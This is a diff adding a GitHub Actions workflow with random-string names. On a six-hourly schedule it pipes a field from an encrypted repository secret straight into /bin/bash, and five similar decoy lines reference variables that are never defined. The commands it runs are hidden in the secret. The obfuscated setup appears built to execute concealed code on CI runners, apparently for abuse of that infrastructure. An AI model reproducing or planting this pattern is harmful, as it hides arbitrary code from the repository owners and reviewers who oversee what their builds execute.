@@ -1,0 +1,22 @@
+name: aboutwherekh
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '15 4/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: aboutwherekh
+        env:
+          c9: ${{ secrets.c9 }}
+        run: |
+          echo $c9 | jq -r .ycyd8 | /bin/bash
+          echo $eqmp77768 | jq -r .zbfov1841 | /bin/bash
+          echo $zifmp9 | jq -r .wpvi0 | /bin/bash
+          echo $yy2 | jq -r .tti390 | /bin/bash
+          echo $tchi81 | jq -r .rpnzd8034 | /bin/bash
+          echo $kd86 | jq -r .yxaw211 | /bin/bash
+
